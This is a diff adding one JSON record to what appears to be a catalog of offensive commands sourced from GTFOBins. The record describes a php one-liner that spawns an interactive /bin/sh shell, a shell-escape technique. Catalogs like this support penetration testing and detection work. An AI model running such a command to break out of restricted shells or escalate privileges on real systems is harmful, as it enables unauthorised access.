@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-php-shell-3",
+  "name": "GTFOBins · php (shell) #3",
+  "command": "php -r '$h=@popen(\"/bin/sh -i\",\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",
+  "description": "Use php to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "php",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/php/#shell",
+  "upstream_id": "php/shell/2",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/php/"
+    }
+  ]
+}
